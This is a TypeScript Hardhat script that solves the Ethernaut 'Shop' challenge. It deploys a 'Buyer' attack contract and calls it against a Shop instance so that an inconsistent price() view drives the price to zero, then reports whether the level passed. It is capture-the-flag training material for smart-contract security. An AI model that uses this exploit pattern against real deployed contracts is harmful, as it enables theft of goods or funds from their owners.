import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackShop = async () => {
    // change contract addresses here.
    const _shopAddr /*Shop instance address*/ = process.env.SHOP!;
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below
    // Exploit comes from two checks of price() and you can change value of second check
    // You may read more on:
    // https://docs.soliditylang.org/en/v0.8.11/contracts.html#view-functions

    // deploying attack contract here
    // const deployed = await deployContract(hre, "Buyer", args);
    // alternative below
    console.log("Deploying attack contract Buyer...");
    const attack = await (await ethers.getContractFactory("Buyer", deployer)).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (buyer.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: buyer.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = ["function price() external view returns (uint)"];
    const contract = await ethers.getContractAt(ABI, _shopAddr);
    console.log("Checking for current price...");
    let price = (await contract.price()).toString();
    console.log(`Current price is: ${price}`);
    console.log("Attacking with malisciuos contract...");
    const tx = await attack.buyFromShop(_shopAddr);
    const txReceipt = tx.wait(1);
    console.log(txReceipt);
    console.log("rechecking for price...");
    price = (await contract.price()).toString();
    console.log(`Price is now: ${price}`);
    if (price === "0") {
        console.log("Congrats! Level passed, Submit to ethernaut");
    } else {
        console.log("Please review code above and try again");
    }
};

attackShop()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
